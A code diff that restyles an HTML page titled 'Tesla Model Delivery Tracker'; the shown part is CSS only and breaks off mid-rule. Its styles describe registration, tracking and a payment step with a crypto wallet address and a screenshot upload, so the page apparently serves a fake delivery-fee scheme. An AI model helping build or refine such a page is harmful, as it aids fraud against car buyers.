@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Tesla Model Delivery Tracker - Iceland</title>
+  <title>Tesla Model Delivery Tracker - Professional Application</title>
   <style>
     * {
       margin: 0;
@@ -11,33 +11,31 @@
       box-sizing: border-box;
     }
 
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-      background: #0f0f0f;
-      color: #fff;
-      line-height: 1.6;
+    html, body {
+      width: 100%;
+      height: 100%;
       overflow-x: hidden;
     }
 
-    /* Main Container */
-    .main-container {
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+      background: #0a0e27;
+      color: #fff;
+      line-height: 1.6;
     }
 
-    /* Navigation Header */
-    .header {
+    /* === NAVIGATION BAR === */
+    .navbar {
       background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
-      border-bottom: 3px solid #e63946;
-      padding: 20px 40px;
-      box-shadow: 0 4px 15px rgba(230, 57, 70, 0.2);
+      padding: 15px 30px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
       position: sticky;
       top: 0;
       z-index: 100;
+      border-bottom: 2px solid #dc143c;
     }
 
-    .header-content {
+    .navbar-content {
       max-width: 1400px;
       margin: 0 auto;
       display: flex;
@@ -46,94 +44,70 @@
     }
 
     .logo {
-      display: flex;
-      align-items: center;
-      gap: 12px;
       font-size: 1.8em;
-      font-weight: 700;
-      letter-spacing: -0.5px;
-    }
-
-    .logo span:first-child {
-      color: #e63946;
-    }
-
-    .logo span:last-child {
-      background: linear-gradient(135deg, #e63946, #ff4757);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-    }
-
-    .step-indicator {
+      font-weight: 900;
       display: flex;
       align-items: center;
-      gap: 40px;
-      list-style: none;
+      gap: 10px;
+      color: #dc143c;
+      text-transform: uppercase;
+      letter-spacing: 2px;
     }
 
-    .step-indicator li {
+    .nav-links {
       display: flex;
+      gap: 20px;
       align-items: center;
-      gap: 8px;
+    }
+
+    .nav-status {
+      background: rgba(220, 20, 60, 0.2);
+      padding: 8px 15px;
+      border-radius: 25px;
+      border: 1px solid #dc143c;
       font-size: 0.85em;
-      color: #888;
-      transition: all 0.3s;
-    }
-
-    .step-indicator li.active {
-      color: #e63946;
       font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 1px;
     }
 
-    .step-indicator li.completed {
-      color: #2ecc71;
-    }
-
-    .step-dot {
-      width: 28px;
-      height: 28px;
-      border-radius: 50%;
-      background: #2d2d2d;
-      border: 2px solid #555;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+    .support-btn {
+      background: #dc143c;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
       font-weight: 600;
-      font-size: 0.8em;
       transition: all 0.3s;
+      text-decoration: none;
+      display: inline-block;
     }
 
-    .step-indicator li.active .step-dot {
-      background: #e63946;
-      border-color: #e63946;
-      color: #fff;
-      box-shadow: 0 0 15px rgba(230, 57, 70, 0.5);
+    .support-btn:hover {
+      background: #b30a30;
+      transform: translateY(-2px);
+      box-shadow: 0 8px 20px rgba(220, 20, 60, 0.3);
     }
 
-    .step-indicator li.completed .step-dot {
-      background: #2ecc71;
-      border-color: #2ecc71;
-      color: #fff;
-    }
-
-    /* Content Area */
-    .content {
-      flex: 1;
+    /* === MAIN CONTAINER === */
+    .main-container {
       max-width: 1400px;
-      width: 100%;
       margin: 0 auto;
-      padding: 40px 40px;
+      padding: 0;
+      min-height: calc(100vh - 70px);
     }
 
-    /* Page Sections */
     .page {
       display: none;
-      animation: fadeIn 0.5s ease-in;
+      min-height: calc(100vh - 70px);
+      padding: 40px 30px;
+      animation: fadeIn 0.5s ease-in-out;
     }
 
     .page.active {
-      display: block;
+      display: flex;
+      flex-direction: column;
     }
 
     @keyframes fadeIn {
@@ -147,40 +121,30 @@
       }
     }
 
-    /* Step 1: Welcome Page */
-    #page-welcome {
-      text-align: center;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
+    /* === PAGE 1: SPLASH SCREEN === */
+    #page-splash {
       justify-content: center;
-      min-height: calc(100vh - 200px);
+      align-items: center;
+      text-align: center;
+      background: linear-gradient(135deg, #0a0e27 0%, #1a1a1a 100%);
     }
 
-    .welcome-content h1 {
-      font-size: 3.5em;
-      font-weight: 800;
-      margin-bottom: 15px;
-      background: linear-gradient(135deg, #e63946, #ff4757);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-      letter-spacing: -1px;
+    .splash-content {
+      animation: slideUp 0.8s ease-out;
     }
 
-    .welcome-content p {
-      font-size: 1.3em;
-      color: #aaa;
-      margin-bottom: 10px;
+    @keyframes slideUp {
+      from {
+        opacity: 0;
+        transform: translateY(50px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
     }
 
-    .welcome-content .subtitle {
-      font-size: 1.1em;
-      color: #666;
-      margin-bottom: 50px;
-    }
-
-    .tesla-icon {
+    .splash-logo {
       font-size: 5em;
       margin-bottom: 20px;
       animation: float 3s ease-in-out infinite;
@@ -191,38 +155,82 @@
       50% { transform: translateY(-20px); }
     }
 
-    /* Step 2: Registration Page */
-    #page-registration {
-      max-width: 600px;
-      margin: 0 auto;
+    .splash-title {
+      font-size: 3em;
+      font-weight: 900;
+      margin-bottom: 15px;
+      background: linear-gradient(135deg, #dc143c 0%, #ff6b6b 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      text-transform: uppercase;
+      letter-spacing: 3px;
     }
 
-    .page-title {
-      font-size: 2.2em;
-      margin-bottom: 10px;
-      color: #fff;
-    }
-
-    .page-subtitle {
-      color: #888;
+    .splash-subtitle {
+      font-size: 1.3em;
+      color: #aaa;
       margin-bottom: 40px;
-      font-size: 1.05em;
+      font-weight: 300;
+    }
+
+    .splash-btn {
+      background: linear-gradient(135deg, #dc143c 0%, #ff6b6b 100%);
+      color: white;
+      padding: 16px 50px;
+      border: none;
+      border-radius: 8px;
+      font-size: 1.1em;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      box-shadow: 0 10px 30px rgba(220, 20, 60, 0.3);
+    }
+
+    .splash-btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 15px 40px rgba(220, 20, 60, 0.5);
+    }
+
+    /* === PAGE 2: REGISTRATION === */
+    #page-registration {
+      justify-content: center;
+      align-items: center;
+      background: linear-gradient(135deg, #0a0e27 0%, #1a1a1a 100%);
+    }
+
+    .registration-container {
+      width: 100%;
+      max-width: 500px;
+      background: #1a1a1a;
+      border: 2px solid #dc143c;
+      border-radius: 15px;
+      padding: 50px 40px;
+      box-shadow: 0 20px 60px rgba(220, 20, 60, 0.2);
+    }
+
+    .reg-header {
+      text-align: center;
+      margin-bottom: 40px;
+    }
+
+    .reg-header h1 {
+      font-size: 2em;
+      color: #dc143c;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      margin-bottom: 10px;
+    }
+
+    .reg-header p {
+      color: #999;
+      font-size: 0.95em;
     }
 
     .form-group {
       margin-bottom: 25px;
-    }
-
-    .form-row {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 20px;
-    }
-
-    @media (max-width: 768px) {
-      .form-row {
-        grid-template-columns: 1fr;
-      }
     }
 
     label {
@@ -231,11 +239,8 @@
       color: #fff;
       font-weight: 600;
       font-size: 0.95em;
-      letter-spacing: 0.3px;
-    }
-
-    label span {
-      color: #e63946;
+      text-transform: uppercase;
+      letter-spacing: 1px;
     }
 
     input[type="text"],
@@ -243,14 +248,14 @@
     input[type="tel"],
     textarea {
       width: 100%;
-      padding: 14px 18px;
-      background: #1a1a1a;
+      padding: 14px 16px;
       border: 2px solid #333;
       border-radius: 8px;
+      background: #0f0f0f;
       color: #fff;
-      font-size: 0.95em;
-      transition: all 0.3s;
+      font-size: 1em;
       font-family: inherit;
+      transition: all 0.3s;
     }
 
     input[type="text"]:focus,
@@ -258,9 +263,14 @@
     input[type="tel"]:focus,
     textarea:focus {
       outline: none;
-      border-color: #e63946;
-      background: #222;
-      box-shadow: 0 0 20px rgba(230, 57, 70, 0.3);
+      border-color: #dc143c;
+      box-shadow: 0 0 20px rgba(220, 20, 60, 0.2);
+      background: #1a1a1a;
+    }
+
+    input::placeholder,
+    textarea::placeholder {
+      color: #666;
     }
 
     textarea {
@@ -268,407 +278,587 @@
       min-height: 100px;
     }
 
-    input.error,
-    textarea.error {
-      border-color: #e63946;
-      background: rgba(230, 57, 70, 0.1);
-    }
-
-    .error-text {
-      color: #e63946;
-      font-size: 0.85em;
-      margin-top: 6px;
-      display: none;
-      font-weight: 500;
-    }
-
-    /* Step 3: Tracking Page */
-    #page-tracking {
+    .form-row {
       display: grid;
-      grid-template-columns: 1.5fr 1fr;
-      gap: 40px;
-      align-items: start;
+      grid-template-columns: 1fr 1fr;
+      gap: 20px;
     }
 
-    @media (max-width: 1024px) {
-      #page-tracking {
+    @media (max-width: 600px) {
+      .form-row {
         grid-template-columns: 1fr;
       }
     }
 
-    .map-container {
-      position: relative;
-      border-radius: 12px;
-      overflow: hidden;
-      box-shadow: 0 10px 40px rgba(230, 57, 70, 0.2);
-      border: 2px solid #e63946;
+    .error-text {
+      color: #ff6b6b;
+      font-size: 0.8em;
+      margin-top: 5px;
+      display: none;
+      text-transform: capitalize;
     }
 
-    #mapFrame {
-      width: 100%;
-      height: 550px;
+    input.error,
+    textarea.error {
+      border-color: #ff6b6b;
+      background: rgba(255, 107, 107, 0.05);
+    }
+
+    .form-actions {
+      display: flex;
+      gap: 15px;
+      margin-top: 35px;
+    }
+
+    .btn-primary {
+      flex: 1;
+      background: linear-gradient(135deg, #dc143c 0%, #ff6b6b 100%);
+      color: white;
+      padding: 14px 30px;
       border: none;
-      border-radius: 10px;
-    }
-
-    .tracking-details {
-      background: linear-gradient(135deg, #1a1a1a 0%, #222 100%);
-      padding: 30px;
-      border-radius: 12px;
-      border: 1px solid #333;
-      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
-    }
-
-    .tracking-details h3 {
-      color: #e63946;
-      font-size: 1.4em;
-      margin-bottom: 25px;
+      border-radius: 8px;
+      font-size: 1em;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s;
       text-transform: uppercase;
       letter-spacing: 1px;
     }
 
-    .detail-item {
-      margin-bottom: 20px;
-      padding-bottom: 20px;
-      border-bottom: 1px solid #333;
+    .btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 30px rgba(220, 20, 60, 0.3);
     }
 
-    .detail-item:last-child {
-      border-bottom: none;
-      margin-bottom: 0;
-      padding-bottom: 0;
+    .btn-primary:active {
+      transform: translateY(0);
     }
 
-    .detail-label {
-      color: #888;
-      font-size: 0.85em;
+    .btn-secondary {
+      flex: 1;
+      background: transparent;
+      color: #dc143c;
+      padding: 14px 30px;
+      border: 2px solid #dc143c;
+      border-radius: 8px;
+      font-size: 1em;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s;
       text-transform: uppercase;
-      letter-spacing: 0.5px;
-      margin-bottom: 6px;
+      letter-spacing: 1px;
     }
 
-    .detail-value {
+    .btn-secondary:hover {
+      background: rgba(220, 20, 60, 0.1);
+      transform: translateY(-2px);
+    }
+
+    /* === PAGE 3: TRACKING SELECTION === */
+    #page-tracking-select {
+      justify-content: center;
+      align-items: center;
+      background: linear-gradient(135deg, #0a0e27 0%, #1a1a1a 100%);
+    }
+
+    .tracking-select-container {
+      width: 100%;
+      max-width: 600px;
+      background: #1a1a1a;
+      border: 2px solid #dc143c;
+      border-radius: 15px;
+      padding: 50px 40px;
+      box-shadow: 0 20px 60px rgba(220, 20, 60, 0.2);
+      text-align: center;
+    }
+
+    .tracking-select-container h1 {
+      font-size: 2em;
+      color: #dc143c;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      margin-bottom: 15px;
+    }
+
+    .tracking-select-container p {
+      color: #999;
+      margin-bottom: 35px;
+      font-size: 0.95em;
+    }
+
+    .tracking-input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 2px solid #333;
+      border-radius: 8px;
+      background: #0f0f0f;
       color: #fff;
       font-size: 1.05em;
-      font-weight: 500;
-    }
-
-    .status-badge {
-      display: inline-block;
-      background: linear-gradient(135deg, #e63946, #ff4757);
-      color: #fff;
-      padding: 8px 16px;
-      border-radius: 20px;
-      font-size: 0.85em;
+      text-align: center;
       font-weight: 600;
-      margin-top: 8px;
-      animation: pulse 2s infinite;
+      letter-spacing: 2px;
+      margin-bottom: 25px;
+      transition: all 0.3s;
     }
 
-    @keyframes pulse {
-      0%, 100% {
-        box-shadow: 0 0 0 0 rgba(230, 57, 70, 0.7);
-      }
-      50% {
-        box-shadow: 0 0 0 10px rgba(230, 57, 70, 0);
-      }
+    .tracking-input:focus {
+      outline: none;
+      border-color: #dc143c;
+      box-shadow: 0 0 20px rgba(220, 20, 60, 0.2);
     }
 
-    /* Step 4: Payment Page */
+    .tracking-buttons {
+      display: flex;
+      gap: 15px;
+    }
+
+    /* === PAGE 4: LIVE TRACKING MAP === */
+    #page-map {
+      background: linear-gradient(135deg, #0a0e27 0%, #1a1a1a 100%);
+      padding: 30px;
+    }
+
+    .map-container {
+      width: 100%;
+      height: calc(100vh - 200px);
+      border: 3px solid #dc143c;
+      border-radius: 15px;
+      overflow: hidden;
+      box-shadow: 0 20px 60px rgba(220, 20, 60, 0.3);
+      margin-bottom: 30px;
+    }
+
+    .map-container iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+
+    .tracking-status {
+      background: #1a1a1a;
+      border: 2px solid #dc143c;
+      border-radius: 12px;
+      padding: 25px;
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 20px;
+      margin-bottom: 25px;
+    }
+
+    .status-item {
+      background: linear-gradient(135deg, rgba(220, 20, 60, 0.1) 0%, rgba(255, 107, 107, 0.05) 100%);
+      padding: 20px;
+      border-radius: 10px;
+      border-left: 4px solid #dc143c;
+      text-align: center;
+    }
+
+    .status-label {
+      color: #999;
+      font-size: 0.85em;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 8px;
+    }
+
+    .status-value {
+      color: #dc143c;
+      font-size: 1.2em;
+      font-weight: 700;
+      word-break: break-word;
+    }
+
+    .tracking-actions {
+      display: flex;
+      gap: 15px;
+      margin-top: 25px;
+    }
+
+    .tracking-actions button {
+      flex: 1;
+      padding: 14px 25px;
+      border-radius: 8px;
+      font-size: 1em;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .btn-continue {
+      background: linear-gradient(135deg, #dc143c 0%, #ff6b6b 100%);
+      color: white;
+      border: none;
+    }
+
+    .btn-continue:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 30px rgba(220, 20, 60, 0.3);
+    }
+
+    /* === PAGE 5: PAYMENT === */
     #page-payment {
-      max-width: 700px;
+      background: linear-gradient(135deg, #0a0e27 0%, #1a1a1a 100%);
+      padding: 40px 30px;
+    }
+
+    .payment-content {
+      max-width: 900px;
       margin: 0 auto;
     }
 
+    .payment-header {
+      text-align: center;
+      margin-bottom: 40px;
+    }
+
+    .payment-header h1 {
+      font-size: 2.5em;
+      color: #dc143c;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      margin-bottom: 10px;
+    }
+
+    .payment-header p {
+      color: #999;
+      font-size: 1.05em;
+    }
+
+    .payment-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 30px;
+      margin-bottom: 40px;
+    }
+
+    @media (max-width: 900px) {
+      .payment-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
     .payment-card {
-      background: linear-gradient(135deg, #1a1a1a 0%, #222 100%);
-      border: 2px solid #e63946;
-      border-radius: 12px;
-      padding: 40px;
-      margin-bottom: 30px;
-      box-shadow: 0 10px 40px rgba(230, 57, 70, 0.2);
+      background: #1a1a1a;
+      border: 2px solid #dc143c;
+      border-radius: 15px;
+      padding: 35px 30px;
+      box-shadow: 0 20px 60px rgba(220, 20, 60, 0.2);
     }
 
     .payment-card h2 {
-      color: #e63946;
-      font-size: 2em;
-      margin-bottom: 10px;
+      color: #dc143c;
+      font-size: 1.5em;
       text-transform: uppercase;
       letter-spacing: 1px;
+      margin-bottom: 20px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
     }
 
-    .fee-amount {
-      font-size: 2.5em;
-      color: #fff;
-      font-weight: 800;
-      margin: 20px 0;
-      text-shadow: 0 0 20px rgba(230, 57, 70, 0.3);
-    }
-
-    .fee-description {
-      color: #aaa;
-      margin-bottom: 30px;
+    .payment-info {
+      color: #ccc;
       line-height: 1.8;
+      margin-bottom: 20px;
     }
 
-    .wallet-section {
-      background: #0f0f0f;
-      padding: 25px;
-      border-radius: 8px;
-      margin: 25px 0;
-      border-left: 4px solid #e63946;
+    .payment-info p {
+      margin-bottom: 15px;
+      display: flex;
+      justify-content: space-between;
     }
 
-    .wallet-label {
-      color: #888;
-      font-size: 0.85em;
+    .payment-info-label {
+      color: #999;
+      font-weight: 600;
       text-transform: uppercase;
-      letter-spacing: 0.5px;
-      margin-bottom: 12px;
+      font-size: 0.85em;
+    }
+
+    .payment-info-value {
+      color: #fff;
+      font-weight: 700;
+      text-align: right;
     }
 
     .wallet-address {
-      background: #1a1a1a;
+      background: #0f0f0f;
       border: 2px solid #333;
-      padding: 16px;
-      border-radius: 6px;
-      font-family: 'Courier New', monospace;
-      font-size: 0.9em;
+      padding: 16px 14px;
+      border-radius: 8px;
       word-break: break-all;
-      color: #2ecc71;
+      font-family: 'Courier New', monospace;
       font-weight: 600;
-      cursor: pointer;
-      transition: all 0.3s;
-      margin-bottom: 12px;
-    }
-
-    .wallet-address:hover {
-      border-color: #e63946;
-      background: rgba(230, 57, 70, 0.05);
+      color: #dc143c;
+      font-size: 0.9em;
+      margin: 20px 0;
+      line-height: 1.6;
     }
 
     .copy-btn {
-      background: #333;
-      color: #fff;
-      border: 1px solid #555;
-      padding: 8px 16px;
-      border-radius: 4px;
-      font-size: 0.85em;
+      width: 100%;
+      background: rgba(220, 20, 60, 0.2);
+      border: 2px solid #dc143c;
+      color: #dc143c;
+      padding: 12px;
+      border-radius: 8px;
       cursor: pointer;
-      transition: all 0.3s;
       font-weight: 600;
+      transition: all 0.3s;
+      text-transform: uppercase;
+      font-size: 0.85em;
+      letter-spacing: 1px;
     }
 
     .copy-btn:hover {
-      background: #e63946;
-      border-color: #e63946;
+      background: rgba(220, 20, 60, 0.3);
     }
 
-    .info-box {
-      background: rgba(230, 57, 70, 0.1);
-      border-left: 4px solid #e63946;
-      padding: 20px;
-      border-radius: 6px;
-      margin: 25px 0;
+    .recipient-card {
+      background: linear-gradient(135deg, rgba(220, 20, 60, 0.1) 0%, rgba(255, 107, 107, 0.05) 100%);
+      border: 2px solid #dc143c;
+      border-radius: 12px;
+      padding: 25px;
+      margin-top: 20px;
+    }
+
+    .recipient-card h3 {
+      color: #dc143c;
+      margin-bottom: 15px;
+      text-transform: uppercase;
+      font-size: 0.95em;
+      letter-spacing: 1px;
+    }
+
+    .recipient-info {
       color: #ccc;
       line-height: 1.8;
     }
 
-    .info-box strong {
-      color: #e63946;
+    .recipient-info p {
+      margin-bottom: 10px;
     }
 
-    .upload-section {
-      background: #1a1a1a;
-      border: 2px dashed #e63946;
+    .recipient-label {
+      color: #999;
+      font-size: 0.85em;
+      text-transform: uppercase;
+      font-weight: 600;
+    }
+
+    .warning-box {
+      background: linear-gradient(135deg, rgba(255, 107, 107, 0.1) 0%, rgba(220, 20, 60, 0.1) 100%);
+      border-left: 4px solid #ff6b6b;
       border-radius: 8px;
-      padding: 40px 20px;
-      text-align: center;
-      margin: 25px 0;
+      padding: 20px;
+      margin: 30px 0;
+      color: #ccc;
+      line-height: 1.8;
+    }
+
+    .warning-box strong {
+      color: #ff6b6b;
+      text-transform: uppercase;
+      font-size: 0.9em;
+      letter-spacing: 1px;
+    }
+
+    .payment-actions {
+      display: flex;
+      gap: 15px;
+      margin-top: 40px;
+    }
+
+    .btn-file-upload {
+      flex: 1;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .btn-file-upload input[type="file"] {
+      position: absolute;
+      left: -9999px;
+    }
+
+    .btn-file-upload label {
+      display: block;
+      background: linear-gradient(135deg, #dc143c 0%, #ff6b6b 100%);
+      color: white;
+      padding: 14px 25px;
+      border-radius: 8px;
       cursor: pointer;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1px;
       transition: all 0.3s;
+      text-align: center;
+      font-size: 1em;
+      margin: 0;
     }
 
-    .upload-section:hover {
-      background: rgba(230, 57, 70, 0.05);
-      border-color: #ff4757;
+    .btn-file-upload input[type="file"]:checked + label,
+    .btn-file-upload label:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 30px rgba(220, 20, 60, 0.3);
     }
 
-    .upload-section p {
-      color: #aaa;
-      margin-bottom: 12px;
-    }
-
-    input[type="file"] {
-      display: none;
-    }
-
-    /* Step 5: Confirmation Page */
-    #page-confirmation {
-      max-width: 700px;
-      margin: 0 auto;
+    .file-name {
+      color: #999;
+      font-size: 0.85em;
+      margin-top: 10px;
       text-align: center;
     }
 
-    .success-icon {
+    /* === PAGE 6: CONFIRMATION === */
+    #page-confirmation {
+      justify-content: center;
+      align-items: center;
+      background: linear-gradient(135deg, #0a0e27 0%, #1a1a1a 100%);
+      padding: 40px 30px;
+    }
+
+    .confirmation-container {
+      width: 100%;
+      max-width: 700px;
+      text-align: center;
+    }
+
+    .success-badge {
       font-size: 4em;
       margin-bottom: 20px;
-      animation: scaleIn 0.6s ease-out;
+      animation: pulse 2s ease-in-out infinite;
     }
 
-    @keyframes scaleIn {
-      from {
-        transform: scale(0);
-      }
-      to {
-        transform: scale(1);
-      }
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.1); }
     }
 
-    .success-title {
+    .confirmation-title {
       font-size: 2.5em;
-      color: #2ecc71;
-      font-weight: 800;
+      color: #dc143c;
+      text-transform: uppercase;
+      letter-spacing: 2px;
       margin-bottom: 15px;
+      font-weight: 900;
+    }
+
+    .confirmation-subtitle {
+      color: #999;
+      font-size: 1.1em;
+      margin-bottom: 35px;
+      line-height: 1.6;
+    }
+
+    .confirmation-details {
+      background: #1a1a1a;
+      border: 2px solid #dc143c;
+      border-radius: 12px;
+      padding: 30px;
+      margin-bottom: 30px;
+      text-align: left;
+    }
+
+    .detail-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 15px 0;
+      border-bottom: 1px solid #333;
+      color: #ccc;
+    }
+
+    .detail-row:last-child {
+      border-bottom: none;
+    }
+
+    .detail-label {
+      color: #999;
+      font-weight: 600;
+      text-transform: uppercase;
+      font-size: 0.85em;
+    }
+
+    .detail-value {
+      color: #dc143c;
+      font-weight: 700;
+      text-align: right;
+    }
+
+    .confirmation-image {
+      max-width: 100%;
+      height: auto;
+      border-radius: 12px;
+      border: 2px solid #dc143c;
+      margin-bottom: 30px;
+      box-shadow: 0 20px 60px rgba(220, 20, 60, 0.2);
+    }
+
+    .confirmation-actions {
+      display: flex;
+      gap: 15px;
+    }
+
+    .btn-finish {
+      flex: 1;
+      background: linear-gradient(135deg, #dc143c 0%, #ff6b6b 100%);
+      color: white;
+      padding: 14px 25px;
+      border: none;
+      border-radius: 8px;
+      font-size: 1em;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s;
       text-transform: uppercase;
       letter-spacing: 1px;
     }
 
-    .success-message {
-      color: #aaa;
-      font-size: 1.1em;
-      margin-bottom: 40px;
-      line-height: 1.8;
+    .btn-finish:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 30px rgba(220, 20, 60, 0.3);
     }
 
-    .confirmation-details {
-      background: linear-gradient(135deg, #1a1a1a 0%, #222 100%);
-      border: 2px solid #2ecc71;
-      border-radius: 12px;
-      padding: 30px;
-      margin-bottom: 30px;
-      box-shadow: 0 10px 40px rgba(46, 204, 113, 0.15);
+    .support-contact {
+      margin-top: 40px;
+      padding-top: 30px;
+      border-top: 2px solid #333;
+      color: #999;
     }
 
-    .confirmation-details .detail-item {
-      text-align: left;
+    .support-contact p {
+      margin-bottom: 15px;
     }
 
-    .screenshot-preview {
-      background: #0f0f0f;
-      border: 2px solid #333;
+    .support-contact a {
+      display: inline-block;
+      background: #dc143c;
+      color: white;
+      padding: 12px 25px;
       border-radius: 8px;
-      padding: 20px;
-      margin: 30px 0;
-      max-height: 400px;
-      overflow: auto;
-    }
-
-    .screenshot-preview img {
-      width: 100%;
-      height: auto;
-      border-radius: 6px;
-    }
-
-    .support-banner {
-      background: linear-gradient(135deg, #e63946 0%, #ff4757 100%);
-      padding: 25px;
-      border-radius: 8px;
-      margin: 30px 0;
-    }
-
-    .support-banner h4 {
-      margin-bottom: 10px;
-      font-size: 1.1em;
-    }
-
-    .support-banner a {
-      color: #fff;
       text-decoration: none;
       font-weight: 600;
-      display: inline-block;
       margin-top: 10px;
-      padding: 10px 20px;
-      background: rgba(255, 255, 255, 0.2);
-      border-radius: 4px;
       transition: all 0.3s;
-    }
-
-    .support-banner a:hover {
-      background: rgba(255, 255, 255, 0.3);
-    }
-
-    /* Buttons */
-    .button-group {
-      display: flex;
-      gap: 15px;
-      margin-top: 40px;
-      justify-content: center;
-      flex-wrap: wrap;
-    }
-
-    button {
-      padding: 16px 40px;
-      font-size: 1em;
-      font-weight: 600;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: all 0.3s;
-      letter-spacing: 0.5px;
       text-transform: uppercase;
+      font-size: 0.85em;
     }
 
-    .btn-primary {
-      background: linear-gradient(135deg, #e63946, #ff4757);
-      color: #fff;
-      box-shadow: 0 6px 20px rgba(230, 57, 70, 0.4);
+    .support-contact a:hover {
+      background: #b30a30;
+      transform: translateY(-2px);
     }
 
-    .btn-primary:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 10px 30px rgba(230, 57, 70, 0.6);
-    }
-
-    .btn-primary:active {
-      transform: translateY(-1px);
-    }
-
-    .btn-secondary {
-      background: #2d2d2d;
-      color: #fff;
-      border: 2px solid #444;
-    }
-
-    .btn-secondary:hover {
-      background: #3a3a3a;
-      border-color: #555;
-    }
-
-    .btn-success {
-      background: linear-gradient(135deg, #2ecc71, #27ae60);
-      color: #fff;
-      box-shadow: 0 6px 20px rgba(46, 204, 113, 0.4);
-    }
-
-    .btn-success:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 10px 30px rgba(46, 204, 113, 0.6);
-    }
-
-    button:disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
-    }
-
-    /* Loading Spinner */
-    .spinner {
-      width: 40px;
-      height: 40px;
-      border: 4px solid #333;
-      border-top: 4px solid #e63946;
+    /* === LOADER === */
+    .loader {
+      width: 50px;
+      height: 50px;
+      border: 5px solid #333;
+      border-top: 5px solid #dc143c;
       border-radius: 50%;
       animation: spin 1s linear infinite;
+      margin: 0 auto;
     }
 
     @keyframes spin {
@@ -676,417 +866,390 @@
       100% { transform: rotate(360deg); }
     }
 
-    .loading-page {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      min-height: calc(100vh - 200px);
-      gap: 20px;
+    /* === PROGRESS INDICATOR === */
+    .progress-bar {
+      width: 100%;
+      height: 4px;
+      background: #333;
+      margin-bottom: 30px;
+      border-radius: 2px;
+      overflow: hidden;
     }
 
-    .loading-page p {
-      color: #888;
-      font-size: 1.1em;
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #dc143c 0%, #ff6b6b 100%);
+      transition: width 0.5s ease;
+      width: 0%;
     }
 
-    /* Footer */
-    .footer {
-      background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
-      border-top: 1px solid #333;
-      padding: 20px 40px;
-      text-align: center;
-      color: #666;
-      font-size: 0.9em;
-    }
-
-    .footer-content {
-      max-width: 1400px;
-      margin: 0 auto;
-    }
-
-    .footer a {
-      color: #e63946;
-      text-decoration: none;
-      transition: all 0.3s;
-    }
-
-    .footer a:hover {
-      color: #ff4757;
-    }
-
-    /* Responsive */
+    /* === RESPONSIVE === */
     @media (max-width: 768px) {
-      .content {
-        padding: 20px;
-      }
-
-      .header-content {
+      .navbar-content {
         flex-direction: column;
-        gap: 20px;
-      }
-
-      .step-indicator {
         gap: 15px;
       }
 
-      .step-indicator li {
-        font-size: 0.7em;
+      .logo {
+        font-size: 1.3em;
       }
 
-      #mapFrame {
-        height: 350px;
+      .splash-title {
+        font-size: 2em;
       }
 
-      .welcome-content h1 {
-        font-size: 2.2em;
+      .registration-container,
+      .tracking-select-container {
+        margin: 20px;
       }
 
-      .page-title {
-        font-size: 1.6em;
+      .payment-grid {
+        grid-template-columns: 1fr;
       }
-    }
 
-    /* Error Message */
-    .error-message {
-      background: rgba(230, 57, 70, 0.15);
-      border: 2px solid #e63946;
-      color: #ff6b7a;
-      padding: 20px;
-      border-radius: 8px;
-      margin-bottom: 25px;
-      font-weight: 500;
+      .map-container {
+        height: 400px;
+        margin-bottom: 20px;
+      }
+
+      #page-map {
+        height: auto;
+      }
+
+      .payment-actions {
+        flex-direction: column;
+      }
+
+      .detail-row {
+        flex-direction: column;
+        gap: 8px;
+      }
+
+      .detail-value {
